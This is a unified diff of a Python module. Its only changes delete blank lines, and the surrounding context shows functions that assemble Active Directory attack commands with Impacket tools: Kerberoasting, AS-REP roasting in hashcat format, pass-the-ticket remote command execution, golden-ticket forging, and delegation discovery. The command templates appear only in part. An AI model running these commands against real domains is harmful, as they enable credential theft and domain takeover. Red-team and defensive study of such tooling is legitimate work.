@@ -10,7 +10,6 @@ __all__ = [
     "find_delegation_command",
 ]
 
-
 def kerberoast_command(
     domain: str,
     username: str,
@@ -24,7 +23,6 @@ def kerberoast_command(
         f"GetUserSPNs.py {domain}/{username}:'{password}' "
         f"-dc-ip {dc_ip} -request -outputfile {output}"
     )
-
 
 def asreproast_command(
     domain: str,
@@ -46,7 +44,6 @@ def asreproast_command(
         f"-outputfile {output} -format hashcat"
     )
 
-
 def pass_the_ticket_command(
     ccache_file: str,
     target: str,
@@ -61,7 +58,6 @@ def pass_the_ticket_command(
         f"export KRB5CCNAME={ccache_file}",
         f"{method}.py -k -no-pass {domain}/{username}@{target} '{command}'",
     ]
-
 
 def golden_ticket_command(
     domain: str,
@@ -83,7 +79,6 @@ def golden_ticket_command(
         ),
         f"export KRB5CCNAME=$(pwd)/{ccache}",
     ]
-
 
 def find_delegation_command(
     domain: str,
